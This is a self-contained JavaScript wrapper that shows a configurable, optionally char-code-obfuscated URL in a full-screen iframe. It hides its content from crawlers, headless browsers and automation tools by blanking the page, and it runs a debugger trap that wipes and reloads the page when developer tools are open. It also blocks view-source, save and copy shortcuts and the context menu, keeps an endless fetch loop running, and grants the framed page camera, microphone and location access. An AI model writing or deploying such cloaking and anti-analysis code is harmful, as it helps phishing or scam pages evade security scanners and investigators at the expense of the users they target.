(function () {
  'use strict';

  // =========================================================================
  // CONFIGURATION: TARGET URL SELECTION
  // =========================================================================
  const CONFIG = {
    USE_ENCODED_URL: false,
    DIRECT_URL: 'https://example.com',
    ENCODED_URL_CODES: [
      104, 116, 116, 112, 115, 58, 47, 47, 101, 120, 97, 109, 112, 108, 101, 46, 99, 111, 109
    ]
  };

  const getTargetUrl = () => {
    if (CONFIG.USE_ENCODED_URL) {
      return String.fromCharCode.apply(null, CONFIG.ENCODED_URL_CODES);
    }
    return CONFIG.DIRECT_URL;
  };

  // =========================================================================
  // 1. FOREVER-LOADING LOOPS (SIMULATED UNFINISHED NETWORK ACTIVITY)
  // =========================================================================
  const startInfiniteLoadingState = () => {
    // A. Endless Async Fetch Stream: Keeps background network requests alive
    const keepNetworkBusy = async () => {
      while (true) {
        try {
          await fetch(`?_infinite_load=${Math.random()}`, {
            cache: 'no-store',
            mode: 'no-cors'
          });
        } catch (e) {
          // Suppress errors to keep loop running
        }
        await new Promise((resolve) => setTimeout(resolve, 300));
      }
    };

    // B. Constant pushState Updates: Simulates non-stop background page navigation
    const triggerStateUpdates = () => {
      setInterval(() => {
        try {
          window.history.replaceState(
            { loading: true },
            document.title,
            window.location.pathname + window.location.search
          );
        } catch (e) {}
      }, 500);
    };

    keepNetworkBusy();
    triggerStateUpdates();
  };

  // =========================================================================
  // 2. SCRAPER & HEADLESS DETECTOR
  // =========================================================================
  const isAutomated = () => {
    const ua = navigator.userAgent.toLowerCase();
    if (/bot|googlebot|crawler|spider|robot|crawling|slurp|bingbot|yandex|baidu|headless|phantom|selenium|puppeteer/i.test(ua)) {
      return true;
    }
    if (navigator.webdriver || !!window.callPhantom || !!window._phantom || !!window.__nightmare) {
      return true;
    }
    if (!navigator.languages || navigator.languages.length === 0) {
      return true;
    }
    return false;
  };

  if (isAutomated()) {
    document.documentElement.innerHTML = '';
    return;
  }

  // =========================================================================
  // 3. DEVTOOLS INTERFERENCE TRAP
  // =========================================================================
  const startDevToolsBlocker = () => {
    const freeze = () => {
      const startTime = performance.now();
      (function () {}.constructor('debugger')());
      const endTime = performance.now();
      if (endTime - startTime > 100) {
        document.body.innerHTML = '';
        window.location.reload();
      }
    };
    setInterval(freeze, 200);
  };

  // =========================================================================
  // 4. UI INTERACTION LOCKOUT
  // =========================================================================
  const lockInteractions = () => {
    window.addEventListener(
      'keydown',
      (e) => {
        if (e.keyCode === 123) e.preventDefault();
        if (e.ctrlKey || e.metaKey) {
          const key = e.key.toLowerCase();
          if (key === 'u' || key === 's' || key === 'i' || key === 'j' || key === 'c') {
            e.preventDefault();
            e.stopPropagation();
          }
        }
      },
      true
    );

    window.addEventListener('contextmenu', (e) => e.preventDefault(), true);
  };

  // =========================================================================
  // 5. IFRAME CONSTRUCTOR
  // =========================================================================
  const buildSecureFrame = () => {
    const iframe = document.createElement('iframe');
    iframe.src = getTargetUrl();

    Object.assign(iframe.style, {
      position: 'fixed',
      top: '0px',
      left: '0px',
      width: '100vw',
      height: '100vh',
      border: 'none',
      outline: 'none',
      zIndex: '2147483647',
      background: '#000'
    });

    iframe.setAttribute('allowfullscreen', 'true');
    iframe.setAttribute('webkitallowfullscreen', 'true');
    iframe.setAttribute('mozallowfullscreen', 'true');

    iframe.setAttribute(
      'allow',
      'fullscreen; autoplay; clipboard-write; encrypted-media; picture-in-picture; camera; microphone; display-capture; geolocation'
    );

    iframe.setAttribute(
      'sandbox',
      'allow-scripts allow-same-origin allow-forms allow-popups allow-modals allow-downloads allow-orientation-lock allow-pointer-lock allow-presentation allow-top-navigation'
    );

    return iframe;
  };

  // =========================================================================
  // 6. DOM TAMPER OBSERVER
  // =========================================================================
  const attachTamperObserver = (targetNode) => {
    const observer = new MutationObserver((mutations) => {
      for (const mutation of mutations) {
        if (mutation.type === 'childList') {
          const removed = Array.from(mutation.removedNodes);
          if (removed.includes(targetNode)) {
            document.documentElement.innerHTML = '';
          }
        }
      }
    });

    observer.observe(document.body, { childList: true, subtree: true });
  };

  // =========================================================================
  // 7. INITIALIZATION
  // =========================================================================
  const init = () => {
    lockInteractions();
    startDevToolsBlocker();
    startInfiniteLoadingState();

    const frame = buildSecureFrame();
    document.body.appendChild(frame);
    attachTamperObserver(frame);
  };

  if (document.body) {
    init();
  } else {
    document.addEventListener('DOMContentLoaded', init);
  }
})();
